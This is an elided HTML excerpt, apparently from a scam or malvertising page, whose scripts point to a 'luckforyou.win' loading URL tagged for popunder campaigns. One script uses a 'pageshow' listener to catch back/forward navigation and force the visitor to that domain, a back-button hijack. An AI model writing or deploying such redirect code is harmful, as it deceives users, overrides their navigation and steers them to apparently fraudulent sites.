...
<head>
    ...
    <script>
            ...
            var split_url = "https://luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=popunder&c2=MX";
        ...
        <script>
            window.addEventListener("pageshow", function (event) {
                (event.persisted || "back_forward" == performance.getEntriesByType("navigation")[0].type) && (window.location.href = "https://luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX")
            });
        </script>
        <script>
        
            var bbURL = "https://luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX";
